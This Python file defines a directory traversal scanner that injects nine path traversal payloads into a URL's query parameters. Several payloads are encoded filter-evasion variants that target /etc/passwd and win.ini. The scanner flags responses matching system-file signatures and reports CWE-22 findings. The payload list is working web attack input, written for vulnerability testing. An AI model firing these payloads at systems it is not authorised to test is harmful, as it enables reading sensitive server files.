from typing import List
import requests
from models.schemas import VulnerabilitySchema, SeverityEnum


class DirectoryTraversalScanner:
    """Directory Traversal / Path Traversal vulnerability scanner"""

    PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..;/..;/..;/etc/passwd",
        "..//..//..//etc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
    ]

    EVIDENCE_PATTERNS = [
        "root:x:",
        "[boot loader]",
        "[extensions]",
        "for 16-bit app support",
        "bash",
        "/bin/sh",
    ]

    def __init__(self, timeout: int = 10):
        self.timeout = timeout

    def scan(self, url: str, depth: int = 1) -> List[VulnerabilitySchema]:
        """Scan URL for directory traversal vulnerabilities"""
        vulnerabilities = []

        try:
            if '?' not in url:
                return vulnerabilities

            base_url, query_string = url.split('?', 1)
            params = {}
            for param in query_string.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    params[key] = value

            # Test each parameter
            for param_name, original_value in params.items():
                for payload in self.PAYLOADS:
                    test_params = params.copy()
                    test_params[param_name] = payload

                    try:
                        response = requests.get(
                            base_url,
                            params=test_params,
                            timeout=self.timeout,
                            allow_redirects=False
                        )

                        # Check for evidence patterns
                        if any(pattern in response.text for pattern in self.EVIDENCE_PATTERNS):
                            vulnerabilities.append(
                                VulnerabilitySchema(
                                    name="Directory Traversal",
                                    description=f"Directory traversal vulnerability detected in parameter '{param_name}'",
                                    severity=SeverityEnum.CRITICAL,
                                    cvss_score=9.1,
                                    url=url,
                                    parameter=param_name,
                                    method="GET",
                                    evidence=response.text[:500],
                                    payload=payload,
                                    remediation="Validate and sanitize all file paths. Use whitelist of allowed files. Avoid direct file system access based on user input.",
                                    references=[
                                        "https://owasp.org/www-community/attacks/Path_Traversal",
                                        "https://cwe.mitre.org/data/definitions/22.html"
                                    ],
                                    cwe_id="CWE-22"
                                )
                            )
                            break

                    except requests.RequestException:
                        continue

        except Exception as e:
            print(f"Error scanning for directory traversal: {e}")

        return vulnerabilities
